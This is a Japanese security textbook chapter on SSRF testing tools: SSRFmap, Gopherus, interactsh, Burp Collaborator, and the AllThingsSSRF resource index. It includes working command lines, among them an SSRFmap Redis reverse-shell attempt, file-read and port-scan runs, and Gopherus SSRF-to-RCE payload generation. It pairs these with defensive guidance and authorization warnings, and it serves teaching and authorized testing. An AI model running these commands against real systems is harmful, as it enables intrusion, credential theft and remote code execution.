# 第8章 ツール習熟

## 自動化・OAST検出ツール（SSRFmap/Gopherus/interactsh）

SSRFの検証・防御検討を進める上で、手作業でのペイロード試行には限界がある。パラメータの種類やエンコーディングのバリエーションは膨大で、しかも多くのSSRFは応答にヒントが出ない「ブラインドSSRF」であるため、そもそも「刺さったかどうか」を目視で判定できない。本節では、この2つの課題——(1) 網羅的なペイロード生成・自動化、(2) ブラインド検知——にそれぞれ対応する代表的なOSSツールを、仕組みレベルで解説する。いずれも診断・研究・自社アセットの防御検証を目的としたツールであり、許可のない第三者システムへの適用は行ってはならない。

### 8-a-1. SSRFmap ── パラメータ自動ファジング＋悪用モジュール群

SSRFmapは、Burp Suiteが吐き出す生HTTPリクエストファイルを入力に取り、指定パラメータへ体系的にペイロードを注入してSSRFを検出・悪用するPythonフレームワークである。単発のペイロード送信ツールではなく、「検出」と「悪用（内部サービスへの二次攻撃）」を一つのパイプラインにまとめている点が特徴である。

#### アーキテクチャ

SSRFmapは以下のコンポーネントに分かれる。

- **リクエストパーサ**: Burp形式（生のHTTPリクエストテキスト）を読み込み、ヘッダー・ボディ（`application/x-www-form-urlencoded`、JSON、XML、multipart等）を構造化する。
- **コアエンジン**: 指定した `-p` パラメータの値を、選択したモジュールが要求するペイロードに差し替えてリクエストを再送する。
- **モジュール**: サービスごとの悪用ロジック（後述）。
- **ハンドラ**: リバースシェル用リスナーなど、コールバックを待ち受ける補助プロセス。

#### 基本コマンド

```bash
python ssrfmap.py -r <request_file> -p <parameter_name> -m <modules> [options]
```

- `-r`: Burp形式のリクエストファイル
- `-p`: ファジング対象のパラメータ名（クエリ、ボディ、ヘッダーいずれも可）
- `-m`: カンマ区切りのモジュール名

対象リクエストファイルはこのような形式で用意する。

```
POST /ssrf HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

url=https://www.example.com
```

なぜこの方式が有効か。実際の脆弱性診断では「どのパラメータがURLフェッチのトリガーになるか」はBurpでの通信観察を通じて既に特定できていることが多い。SSRFmapはその「本物のリクエスト構造（Cookie、CSRFトークン、認証ヘッダーなど）」をそのまま保持しながら、対象パラメータの値だけを機械的に差し替える。これにより、認証済みセッションが必要なSSRFエンドポイントに対しても、手動でリクエストを組み立て直す手間なく大量のペイロードを試せる。

#### 部分注入（`*FUZZ*`マーカー）

パラメータ全体を置換するのがデフォルト挙動だが、値の一部だけを差し替えたいケース（例: `https://cdn.internal.example.com/*FUZZ*` のように、ホスト名の一部やパスだけを操作したい場合）では `*FUZZ*` マーカーを使い、周囲の文字列を保持したままペイロードを埋め込める。これは、アプリケーション側が「特定のプレフィックス/サフィックスを持つURLしか受け付けない」といった簡易フィルタ（部分一致による許可リスト）を実装している場合に、そのフィルタを満たしつつ内部で解釈されるURL構造を作るのに重要になる仕組みである。

#### モジュール一覧（カテゴリ別）

| カテゴリ | モジュール例 |
|---|---|
| DNS/ネットワーク | `axfr`（ゾーン転送）, `portscan`, `networkscan`, `smbhash` |
| データベース | `redis`, `mysql`, `postgres`, `memcache` |
| クラウドメタデータ | `aws`, `gce`, `alibaba`, `digitalocean` |
| サービス固有 | `fastcgi`, `github`, `zabbix`, `docker`, `smtp`, `tomcat` |
| ユーティリティ | `readfiles`, `socksproxy`, `custom` |

**なぜこの分類が本質を表しているか**: SSRFの実害は「SSRF自体」ではなく、SSRFを踏み台にして到達可能になる内部リソースの性質で決まる。`portscan`/`networkscan`はSSRF箇所を内部ネットワークの偵察エンジンとして使う（レスポンスタイミングやステータスコードの差異からポート開閉を推測する）。`aws`/`gce`/`alibaba`/`digitalocean`はクラウドのインスタンスメタデータサービス（IMDS、通常 `169.254.169.254`）へのリクエストを送り、一時認証情報などを狙う。`redis`/`mysql`/`fastcgi`はGopher等の生プロトコルペイロードを組み立てて認証のない内部ミドルウェアを操作する——後述するGopherusと同じ発想である。

#### 主要CLIオプション

| オプション | 用途 |
|---|---|
| `-l PORT` | リバースシェル用リスナーを起動 |
| `--lhost` / `--lport` | コールバック先の攻撃者IP/ポート |
| `--ldomain` | DNSゾーン転送等で使うドメイン |
| `--rfiles` | `readfiles`モジュールで読み取るファイルパス |
| `--level [1-5]` | WAF回避のためのペイロード変異度 |
| `--ssl` | 証明書検証なしでHTTPS強制 |
| `--proxy` | HTTP(S)プロキシ経由で送信 |
| `--uagent` | User-Agentのカスタマイズ |

`--level` は、IPv6表記（`http://[::ffff:127.0.0.1]/`）、8進数/10進数IP表記（`http://0177.0.0.1/` や `http://2130706433/`）などのエンコーディングバリエーションを段階的に増やしてリクエストを生成する。これは、URLパーサの正規化差異を悪用したフィルタバイパス（本教科書の別章で扱うSSRFフィルタ回避の原理と同一）を自動化したものである。単純な文字列比較で「`127.0.0.1`という文字列を含むリクエストを拒否する」ようなブロックリスト実装は、パーサが最終的に同じIPへ解決する別表記を見落とすため、これらのバリエーションでバイパスされ得る。

#### 実行例

```bash
# metadata取得とファイル読み取りを同時に試す
python ssrfmap.py -r examples/request.txt -p url -m readfiles,aws

# Redis経由でリバースシェルを試みる（リスナーも同時起動）
python ssrfmap.py -r examples/request.txt -p url -m redis \
  --lhost=127.0.0.1 --lport=4242 -l 4242

# ヘッダーインジェクション型SSRFに対してファイル読み取り
python ssrfmap.py -r examples/request6.txt -p X-Custom-Header \
  -m readfiles --rfiles /tmp/sensitive

# WAF回避を意識したポートスキャン
python ssrfmap.py -r examples/request.txt -p url -m portscan \
  --level 3 --ssl --uagent "Custom/1.0"
```

`-l`（リスナー）オプションを使うモジュール（例: `redis`）は、攻撃者側でリバースシェルの接続を待ち受けるプロセスを同時に起動する必要がある点に注意する。これはリモートで実行させたコマンドの出力を得るための、通常のリバースシェル確立の仕組みと同じである。

#### 導入方法

```bash
# ネイティブ実行
uv sync --frozen && uv run python ssrfmap.py

# Docker
# （リクエストファイルとloot出力用ディレクトリをボリュームマウントして実行）
```

テストは `uv run pytest` で、examples配下に同梱されたFlask製の疑似SSRF脆弱サービスに対して実行される。診断者が自分の検証環境でツールの挙動を確認する用途に適している。

#### 運用上の注意点

- 取得したファイルやクラウド認証情報は `loot/<target>/` 配下に保存される（`.gitignore`済み）。診断報告書に添付する場合は機微情報のマスキングを忘れないこと。
- `--ssl` は証明書検証を無効化するため、自己署名証明書を使う内部サービス相手のテストで有用だが、本番導入には使わない。
- モジュールによっては追加パラメータが必須（DNSゾーン転送には `--ldomain`、ファイル読み取りには `--rfiles` など）であり、指定漏れはモジュール自体の動作不能につながる。

> 出典: SSRFmap — https://github.com/swisskyrepo/SSRFmap

### 8-a-2. Gopherus（再掲） ── SSRF → RCE のgopherペイロード生成

GopherusはPython製のCLIツールで、`gopher://` スキームを使い、SSRF経由で内部の生プロトコルサービス（データベースやアプリケーションサーバー）に対して任意のバイトストリームを送り込み、RCE（リモートコード実行）へつなげるペイロードを対話的に生成する。第5章で扱ったGopherプロトコルの悪用原理をそのままツール化したものであり、本節では「ツールとしての使い方」に焦点を当てる。

#### 対応する内部サービス（7種類）

| サービス | 想定ポート | 悪用内容 |
|---|---|---|
| MySQL | 3306 | 認証なしでのDBダンプ、ファイル書き込み経由の悪用 |
| PostgreSQL | 5432 | 認証を経ないDB操作 |
| FastCGI | 9000 | PHPファイル経由のコード実行 |
| Redis | 6379 | ファイル上書き、リバースシェル、PHP Webシェル設置 |
| Zabbix | 10050 | リモートコマンド機能が有効な場合のシェルコマンド実行 |
| Memcached | 11211 | 言語別（Python/Ruby/PHP）デシリアライズ経由のデータ窃取 |
| SMTP | 25 | 被害者ユーザーへのなりすましメール送信 |

#### 仕組み: なぜGopherペイロードでこれが可能なのか

Gopherプロトコルの `gopher://host:port/_<data>` というURL形式は、`<data>` 部分に任意のバイト列をそのままTCPソケットへ書き込ませる。多くのSSRF脆弱なライブラリ（cURL、各言語のHTTPクライアント）はスキームとしてgopherをサポートしており、SSRFの脆弱なURL取得箇所にこのURLを渡すと、アプリケーションサーバーが「Gopherクライアント」として振る舞い、内部サービスへ生のプロトコルコマンド列を送信してしまう。

Redis、MySQL、Memcachedなどの多くの内部ミドルウェアは、内部ネットワークからの接続を前提に認証を無効化またはデフォルト無効の状態で運用されることが多い（信頼境界の内側だから安全という設計判断）。SSRFはこの「信頼境界」を外部から踏み越える手段であり、Gopherペイロードは踏み越えた後に「何を話すか」をエンコードする手段である、という二段構造を理解することが本質である。

#### 使い方

```bash
gopherus --exploit [service_name]
```

対話式に、対象サービスに応じたパラメータ（ユーザー名、データベース名、書き込みたいファイルパスや内容など）を尋ねられ、最終的に完成した `gopher://` URLペイロードが出力される。この出力をそのままSSRF脆弱パラメータに注入する。

#### 悪用連鎖（SSRF→RCE）の流れ

1. アプリケーションにSSRF脆弱性があり、任意URLを取得できることを確認する。
2. Gopherusで対象の内部サービス（例: Redis）向けのペイロードを生成する。
3. 生成された `gopher://` URLをSSRF脆弱パラメータに注入する。
4. 脆弱なアプリケーションがそのURLへリクエストを発行し、Gopherペイロードのバイト列が内部サービスへそのまま送られる。
5. 内部サービスがコマンドとして解釈し実行する（例: Redisの `CONFIG SET dir` / `CONFIG SET dbfilename` を悪用したWebシェル設置からのRCE）。

#### 前提条件

- Python実行環境。
- SSRF脆弱性そのものが存在すること（Gopherusはペイロード生成のみを行い、SSRFの発見自体は行わない）。
- 内部サービスが外部認証なしにアクセス可能であること（多くのデフォルト構成のRedis/Memcachedがこれに該当する）。

#### 防御的な観点

Gopherペイロードが成立する前提は「アプリケーションのHTTPクライアントがgopherスキームを許可している」ことと「内部サービスが未認証で到達可能」であることの2点である。防御としては、外部向けURL取得を行うコンポーネントで許可するスキームを `http`/`https` のみに制限し（gopher, file, ftp, dictなどを拒否）、内部ミドルウェアには認証を必須化し、ネットワークセグメンテーションでSSRF発生源から到達可能な範囲を最小化する、という多層防御が有効である。

> 出典: Gopherus — https://github.com/tarunkant/Gopherus

### 8-a-3. interactsh（再掲） ── OOB/OAST検出、Burp Collaboratorの無償代替

interactshはProjectDiscoveryが開発するOSSで、「OOB（Out-of-Band）インタラクション収集サーバーおよびクライアントライブラリ」である。応答本文に痕跡が出ないブラインドSSRF（あるいはブラインドXXE、ブラインドコマンドインジェクションなど）を、外部通信の観測によって間接的に検知する。

#### なぜOOB検知が必要か（原理）

通常のSSRF検証では「注入したURLへアプリケーションがリクエストを送ったか」をレスポンスの内容やタイミングから推測する。しかし多くの実運用アプリケーションは、フェッチ結果をそのままレスポンスに含めない（非同期処理、内部ログのみへの記録、単なるWebhook登録など）。この場合、レスポンスを見ているだけでは脆弱性の有無を判定できない。

OOB/OAST（Out-of-Band Application Security Testing）は、この問題を「別チャネルでの受信」で解決する。攻撃者（診断者）が制御するドメインへの一意なサブドメインを生成し、それをペイロードとしてSSRF脆弱箇所に注入する。アプリケーションが実際にそのURLへリクエストを（DNS解決だけでも、あるいはHTTP接続まで）発生させれば、診断者が制御するサーバー側でその通信を観測でき、「アプリケーションが外部リクエストを発行した」という事実そのものが脆弱性の証拠になる。

#### アーキテクチャ: クライアント/サーバーモデル

- **サーバー**: 複数プロトコル（DNS/HTTP/SMTP/LDAP、自己ホスト構成ではFTP/SMB/NTLMも）で待ち受け、着信したすべてのインタラクションを記録する。ドメインの設定が必要。
- **クライアント**: 一意なペイロード（サブドメイン）を生成し、サーバーに対してポーリングし、自分が生成したペイロードに紐づくインタラクションを取得する。

相関の仕組みは「一意なサブドメイン」にある。ペイロード生成のたびに `c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro` のようなランダムなラベルを持つサブドメインが作られ、サーバー側はどのラベルにどの通信が来たかを記録するため、複数のテストケースを並行して走らせても取り違えが起きない。

#### 対応プロトコル

- DNS（A, AAAA, MX, TXTレコード）
- HTTP / HTTPS
- SMTP / SMTPS
- LDAP
- FTP/FTPS（自己ホスト時）
- SMB/NTLM（自己ホスト時、Responder経由）

IPv4/IPv6双方に対応する。SSRFの検知という文脈では、DNSクエリだけが飛んでもHTTP接続まで到達してもどちらも「解決が発生した」証拠になるため、DNSのみをブロックしHTTP到達を許可しない環境／逆にDNSは許可されてもアウトバウンドHTTPが遮断されている環境、といった内部ネットワークの通信可否の切り分けにも使える。

#### interactsh-client の使い方

インストール（Go 1.20+が必要）:

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

基本実行（ペイロードを1つ生成し、対話的にポーリングを開始する）:

```bash
interactsh-client
```

主なフラグ:

| フラグ | 用途 |
|---|---|
| `-n` | 生成するペイロード数 |
| `-o` | 結果の出力ファイル |
| `-v` | リクエスト/レスポンス全体を表示する詳細モード |
| `-sf` | セッションファイル（再開用） |
| `-s` | 使用するinteractshサーバーの指定 |
| `-json` | JSONL形式で出力 |
| `-auth` | PDCP APIキーによるクラウドサービス認証（`https://cloud.projectdiscovery.io`） |

ワークフローとしては、`interactsh-client` で得た一意ドメインをSSRF疑いのあるパラメータに注入し、クライアントがポーリングで着信を検知すればSSRFの存在が確定する、という使い方になる。

#### 自己ホスト構成（interactsh-server）

パブリックな共有インスタンス（`oast.pro`, `oast.live`等）を使いたくない場合（機密性の高い診断、社内ネットワークからの外部到達確認など）は自己ホストが可能。

必要なもの:
1. カスタムネームサーバーを設定できるドメイン（レジストラでNSレコードを委任）
2. 常時稼働するVPS（小規模インスタンスで十分とされる）

インストールと起動:

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
interactsh-server -domain yourdomain.com
```

サーバーは公開IPを自動検出し、基本設定を自動構成する。複数ドメインの同時運用も可能（`-d oast.pro,oast.me`）。

自己ホスト時の主なオプション:

- `-a` / `-t token`: アクセス制御（トークン認証）を有効化
- `-wildcard`: ワイルドカードドメインを複数クライアントで共有しつつ、クライアントごとに独立してバッファリング
- `-cert` / `-privkey`: 自動証明書生成の代わりにカスタムSSL証明書を使用
- `-cidl` / `-cidn`: 相関IDの長さ調整（クライアント側の設定と一致させる必要がある）
- `-dynamic-resp`: クエリパラメータでHTTPステータスコード・ヘッダー・本文・遅延を動的制御
- `-http-directory`: 静的ペイロードを `/s/` パス配下でホスティング
- リバースプロキシ（Nginx）配下でのHTTP/TCP/UDPポートフォワーディングにも対応

#### Burp Collaboratorとの位置づけ

interactshはBurp Collaboratorと同種の機能（OOBインタラクション収集）を提供するが、OSSであり自己ホストが可能な点が異なる。公開サーバーはデフォルトでAESによる暗号化とゼロロギングを謳っており、ACMEベースのワイルドカード証明書自動更新でHTTPS通信も保護される。Burp拡張、Nuclei（テンプレート内でのOOBペイロード自動生成）、ZAPのOASTアドオンなど主要ツールとの統合点も用意されており、既存の診断ワークフローに組み込みやすい。

#### SSRF検知における実践的な使い方

1. `interactsh-client` を起動し、生成された一意ドメイン（例: `xxxx.oast.pro`）を控える。
2. アプリケーションのURL入力欄・Webhook登録欄・画像プレビュー機能・PDF生成機能など、外部リクエストを発行しそうな箇所にそのドメインを注入する。
3. クライアントのポーリング画面、または `-v` オプションでの詳細出力を監視する。
4. DNSクエリのみ着信した場合は「名前解決のみ発生」、HTTPリクエストまで着信した場合は「実際に接続が確立された」ことを意味し、フィルタがDNS解決の後段（接続確立前）でブロックしている可能性など、防御側の実装箇所の特定にも役立つ。

#### 防御的な観点

自組織のアプリケーションがOOBサーバーへの通信を検知された場合、それは「外部到達可能なリクエスト発行経路が存在する」ことの直接証拠である。防御側は、この検知結果を使ってアウトバウンド通信を許可リスト方式（必要なドメイン/IPのみ許可）に切り替える、内部プロキシでの一元的な通信監査を行う、DNSクエリログを監視して未知ドメインへの解決を異常検知に組み込む、といった対策の優先順位付けに活用できる。

> 出典: interactsh — https://github.com/projectdiscovery/interactsh

### まとめ

| ツール | 役割 | 使いどころ |
|---|---|---|
| SSRFmap | 検出の自動化＋内部サービス悪用の一括実行 | Burpで見つけたSSRF疑いパラメータへの網羅的ファジングと、発見後の影響範囲確認 |
| Gopherus | Gopherペイロード生成 | SSRFが確認済みで、内部ミドルウェアへのRCE到達可否を検証する段階 |
| interactsh | ブラインドSSRFのOOB検知 | レスポンスに痕跡が出ない箇所で「外部リクエストが本当に発行されたか」を確定させる段階 |

3つのツールは検証プロセスの異なる段階を担っており、実務では「interactshで存在を確定 → SSRFmapで影響範囲を自動探索 → Gopherusで内部サービスへの到達可否を検証」という順序で組み合わせて使われることが多い。いずれも防御側にとっては「攻撃者が使う手段を先回りして自組織に対して（許可を得た範囲で）試す」ことで、フィルタの穴やネットワークセグメンテーションの不備を事前に洗い出すための道具である。

---

## Burp Suiteと実例インデックス

SSRF（Server-Side Request Forgery: サーバーサイドリクエスト偽造。サーバーがユーザー制御の入力に基づいて意図しない宛先へリクエストを送信してしまう脆弱性）の検証は、レスポンスが画面に直接返ってこない「blind（ブラインド）」なケースが大半を占める。したがって本章では、blind SSRFを検出・確認するための道具であるBurp Suiteの中核機能と、実際の脆弱性がどのような形で見つかってきたかを俯瞰できる索引サイトを扱う。前者は「どうやって検出するか」、後者は「何を探せばよいか」という、SSRF調査の車の両輪にあたる。

### Burp Suiteの全体像と製品ラインナップ

PortSwigger社のBurp Suiteは、Webアプリケーションのセキュリティテストに使われるプロキシ型のツールスイートである。現在のラインナップは次の4系統に整理されている。

- **Burp AT** — 人間主導のペネトレーションテストを拡張するエージェント型AI機能。
- **Burp Suite DAST** — エンタープライズ向けに自動化された動的Web脆弱性スキャナ。
- **Burp Suite Professional** — 手動テストとBurp Scannerによる自動スキャンの両方を備えた、実務者向けの主力製品。
- **Burp Suite Community Edition** — 手動テストツールのみを無料で提供するエディション。

SSRFの検証で実務上よく使われるのは、リクエストを傍受・編集する「Proxy」、リクエストを手動で繰り返し送って応答の違いを比較する「**Repeater**」、パラメータを自動的に差し替えて大量送信する「**Intruder**」、そして本節の核である「**Collaborator**」の4つである。Repeater/IntruderはCommunity Editionでも制限付きで使えるが、後述するCollaboratorのフル機能はProfessional（またはDAST）が前提になる。

> 出典: Burp Suite（製品トップページ） — https://portswigger.net/burp

### Burp Collaboratorとは何か、なぜ必要か

SSRFの被害には大きく2種類ある。1つは「レスポンスがそのまま画面に表示される」タイプ（例: 画像プレビュー機能がフェッチ結果をそのまま埋め込む場合）で、これはRepeaterでリクエストを送るだけで結果が目に見える。もう1つが「blind SSRF」であり、サーバーは内部で確かにリクエストを発行しているが、その結果はアプリケーションのレスポンスに一切反映されない。この場合、単にリクエストを送って画面を眺めるだけでは、脆弱性の有無を判定できない。

ここで使うのがOAST（Out-of-band Application Security Testing: アプリケーションの応答経路とは別の帯域外チャネルを使ってテストする手法）という考え方であり、Burp Collaboratorはその実装である。Collaboratorは「エラーメッセージも、出力の差分も、検知可能な時間遅延も生じない、見えない脆弱性」を特定するために設計されたネットワークサービスだと説明されている。

仕組みは次の2ステップに整理できる。

1. **ペイロードの注入**: Burpは、Collaboratorサーバーのドメインのサブドメインとして生成された一意のペイロード（例: `a1b2c3d4e5f6g7h8.oastify.com` のようなランダム文字列を含むホスト名）を、テスト対象アプリケーションへのリクエストに埋め込む。これは、Burpが持つ外部到達可能なサーバーのアドレスをアプリケーションに「覚えさせる」操作である。
2. **インタラクションのポーリング**: Burpはその後、Collaboratorサーバーに定期的に問い合わせを行い（ポーリング）、注入したペイロードに対してターゲットアプリケーションが何らかの通信（DNS解決やHTTPリクエストなど）を行ったかどうかを確認する。

> 出典: Burp Collaboratorのしくみ — https://portswigger.net/burp/documentation/collaborator

#### なぜこの仕組みでblind SSRFが検出できるのか

ここが本節の核心である。SSRFの本質は「サーバー自身にリクエストを発行させる」ことにあるため、たとえレスポンスが画面に返らなくても、**サーバーが外部の名前解決やTCP接続を試みたという事実そのものが、外側から観測可能な副作用として残る**。

- ユーザーが `url=http://攻撃者が用意したCollaboratorのサブドメイン/` のような値をSSRFの疑いがあるパラメータ（例: Webhook URL、画像取り込みURL、PDF生成に使うURL、URLプレビュー機能など）に注入する。
- サーバー側のコードがこのURLに対して内部的に `fetch`/`curl`/`requests.get` のような処理を行うsink（入力が最終的に実行・解釈される危険な代入先。ここでは「HTTPクライアントに渡されるURL文字列」がsinkにあたる）を持っていれば、そのサーバーはまず**DNS解決**を行い、次に**TCP接続・HTTPリクエスト送信**を試みる。
- DNS解決は多くの環境でファイアウォールのアウトバウンド制限をすり抜けやすい（UDP/53が許可されていることが多い）ため、たとえHTTP自体がブロックされていても、DNSクエリがCollaboratorサーバーに届くだけで「このパラメータはサーバー側で名前解決される=何らかのネットワーク処理に渡っている」という強い証拠になる。
- Collaboratorはこのポーリングの結果として、DNS/HTTP(S)/SMTPいずれかのインタラクションを受信すれば、それを（送信元IP、タイムスタンプ、リクエストの生データとともに）Burp上に通知する。

つまりCollaboratorは、「レスポンスに何も出ない」というSSRF検証最大の壁を、「ネットワークプロトコルの挙動（DNS解決は独立した副作用として観測できる）」という別の経路に置き換えることで突破している。これはSSRF固有の技術というより、OAST全般（Blind SQLiやXXEの帯域外検出にも同じ発想が使われる）に共通する原理だが、SSRFの検出手段としては最も基本かつ実務で多用される手法である。

#### 実務での使い方（概念）

Burp Suite Professionalでは、Repeaterで送るリクエストの任意の位置に「Insert Collaborator payload」でユニークなペイロードを挿入できる。例えば、あるAPIがWebhook登録機能を持っていると仮定する。

```
POST /api/webhooks HTTP/1.1
Host: example-target.internal-test
Content-Type: application/json

{"callback_url": "http://x7f2n9k1.oastify.com/"}
```

このリクエストを送信後、Burp Collaborator clientのタブを開き「Poll now」（手動ポーリング）を実行するか、自動ポーリングの完了を待つ。もし `x7f2n9k1.oastify.com` へのDNSクエリやHTTPリクエストがCollaboratorサーバーに記録されていれば、`callback_url` パラメータがサーバー側で実際にネットワークリクエストの発行に使われている、つまりSSRFの糸口が存在することが確認できる。ここで「なぜPOSTの中身ではなく別チャネルの記録を見るのか」といえば、まさにアプリケーション自身のレスポンスには一切この事実が現れないためであり、これがblind SSRF検証がCollaborator（あるいは自前のDNSロギングサーバー、`interactsh` など同種のOASTツール）を必須とする理由である。

なお本書はSSRFの検出・防御の原理解説を目的としており、実在サービスや権限のない本番環境に対してこうしたペイロードを送信する行為は、必ず許可された検証環境（バグバウンティのスコープ内、自前のラボ環境など）に限定すべきである。無許可の対象への適用は行ってはならない。

#### 防御側の視点

Collaboratorのようなツールで検出される「アウトバウンドDNS/HTTPの発生」は、そのまま防御側の監視ポイントにもなる。具体的には、アプリケーションサーバーからの予期しない外部ドメインへのDNSクエリやHTTP接続をネットワーク層・DNSログで監視することは、SSRFの悪用（あるいは悪用の試み）を検知する有効な手段である。また、サーバー側でURLを扱う処理には許可リスト（allowlist）方式の宛先制限を設け、DNS解決結果に対しても再検証（TOCTOU: Time-of-check to time-of-useのズレを突いたDNS Rebinding対策）を行うことが根本的な緩和策になる。

> 出典: Burp Suite（製品トップページ、および付随のCollaboratorドキュメント） — https://portswigger.net/burp

### AllThingsSSRF: SSRF専門の資料索引

[AllThingsSSRF](https://github.com/jdonsec/AllThingsSSRF)は、@jdonsecがGitHub上で公開しているキュレーション型のリポジトリで、SSRFに関するライトアップ（writeup: 実際に見つけた脆弱性の再現手順や発見経緯を書いた報告記事）、チートシート、動画、ツール、CTF/ラボ環境を一箇所に集約したものである。継続的に更新されるインデックスであり、ブラウザのブックマークに入れておき「SSRFで行き詰まったらまずここを見る」という使い方をするのが実務的である。以下、カテゴリごとに構成と代表的な内容を要約する（個々のリンク先の内容そのものは未検証であり、あくまで索引としての価値を紹介する）。

#### 学習用資料（Learn What is SSRF）

SSRFの基礎から発展的な話題までを扱う記事群。Vickie Liによる入門記事群（「Intro to SSRF」「Exploiting SSRFs」）、Detectify・Netsparker・HackerOneによる解説記事、そして特に重要なのが**Orange Tsaiの「A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!」**（BlackHat 2017）である。これは、各言語・ライブラリのURLパーサ実装の差異（例: `http://user@host:evil.com`のような紛らわしい構文の解釈のずれ）を突いてSSRFフィルタを回避する手法を体系化した、SSRF研究における画期的な発表として知られる。ほかにも「SSRF bible」というチートシートPDFや、PayloadsAllTheThingsのSSRFセクション、CTF Wikiの解説などが並ぶ。

#### ライトアップ・事例集（Writeups）

実際にバグバウンティやCTFで発見されたSSRFの事例が多数収録されている。代表例:

- **Cracking the Lens**（@albinowax / PortSwigger Research）— HTTPの「隠れた攻撃対象領域」を狙う研究。
- **GitLab SSRFからRCEへの連鎖**（Orange Tsai、LiveOverFlow）— GitLabのWebhook機能に存在したSSRFを起点に、IPv4/IPv6アドレス埋め込みとgit://プロトコルへのCRLFインジェクションを組み合わせてRCE（Remote Code Execution）まで昇格させた事例。
- **Vimeo SSRF with code execution potential**（Harsh Jaiswal）— 動画処理機能のSSRFがコード実行につながった例。
- **AWS metadataの窃取事例**（Coen Goedegebure、Pratik Yadavなど）— クラウド環境特有の「メタデータサービス（`169.254.169.254`）へのSSRF」がクレデンシャル漏洩に直結するパターンを示す複数の記事。
- **Slackでの$1,000バウンティ**（Elber "f0lds" Tavares）— 主要SaaS製品での実例。

これらはいずれも「SSRFは単体では地味に見えても、内部ネットワークの構造（クラウドメタデータ、内部API、他プロトコルの悪用）と組み合わさることで重大な被害に発展する」という、この教科書全体で繰り返し強調すべき教訓を裏付ける一次資料群である。

#### HackerOne報告書（HackerOne Reports）

50件以上の実際の脆弱性報告への直リンクが列挙されている。代表的なものとして、SVGファイルのレンダリング処理を悪用したSSRF（#223203）、FFmpegのHLS処理を悪用したSSRF（#237381など複数件）、`proxy.duckduckgo.com`を踏み台にしたAWSメタデータサーバーへのアクセス（#395521）、Exchangeサーバーのroot権限奪取に至ったSSRF（#341876、André Baptista）、Sentry設定不備によるblind SSRF（#374737）などがある。これらは、実際の報告書のフォーマット（再現手順・影響範囲・修正状況）を読むことで、自分のレポート作成の参考にもなる。

#### 動画・PoC（Videos/POC）

Black HatやDEF CON、Hacker101、Bugcrowd Universityなどでの発表動画がまとめられている。Nahamsecによる「Owning the Clout through SSRF and PDF Generators」（DEF CON 27、Snapchat広告基盤でのSSRF）や、LiveOverFlowによる「PHP include and bypass SSRF protection with two DNS A records」（DNS Rebindingを利用したフィルタ回避のデモ）など、テキストのライトアップだけでは伝わりにくい「実際の操作画面」を見られる点に価値がある。

#### ツール（Tools）

3つのツールが紹介されている。

- **SSRF Proxy**（bcoles）— HTTPプロキシサーバーとして動作し、既存のツール（Burpなど）からのリクエストをSSRFの脆弱なエンドポイント経由でルーティングし直すことで、脆弱なアプリケーションを踏み台にした間接的なスキャンを可能にするツール。
- **SSRFTest**（daeken）— SSRFの検証を支援するテストツール。
- **httprebind**（daeken）— DNS Rebinding攻撃（名前解決の結果を途中で外部IPから内部IPへ切り替えることで、ホスト名ベースの許可リストを回避する手法）を実演・検証するためのツール。

#### CTF・ラボ環境（CTF/Labs）

自分の環境で安全に手を動かして学ぶための場が列挙されている。PortSwigger自身が提供する[Web Security AcademyのSSRFラボ](https://portswigger.net/web-security/ssrf)、Pentester Labの有料演習（Essential: SSRF 01〜04の4段階）、独立系のm6a-UdSによるSSRFラボ環境（GitHubでホストされたDockerベースの練習環境）などが含まれる。これらは全て許可された学習用環境であり、本書のスコープ方針（防御目的・許可なき本番検証の禁止）とも合致する使い方ができる。

> 出典: AllThingsSSRF — https://github.com/jdonsec/AllThingsSSRF

### この2つをどう組み合わせて使うか

実務的なワークフローとしては、まずAllThingsSSRFのようなインデックスで「そのアプリケーションが持つ機能カテゴリ（Webhook、画像/PDF生成、URLプレビュー、SSOのメタデータ取得など）に対応する既知の脆弱パターン」を素早く把握し、次にBurp Suite（RepeaterでペイロードのバリエーションをテストしつつCollaboratorでblindな反応を監視する）で仮説を実際に検証する、という流れになる。索引サイトは「何を疑うべきか」の仮説形成を助け、Collaboratorは「その仮説が正しいかどうか」を、レスポンスに何も現れない状況でも判定可能にする。この2つが揃って初めて、blind SSRFという「見えない脆弱性」を体系的に扱えるようになる。

---

## ナビゲーション

← [第7章 応用・現代トピック](07-advanced-topics.md)  ｜  [📚 目次（ホーム）](index.md)  ｜  [第9章 防御・検出・修正](09-defense.md) →
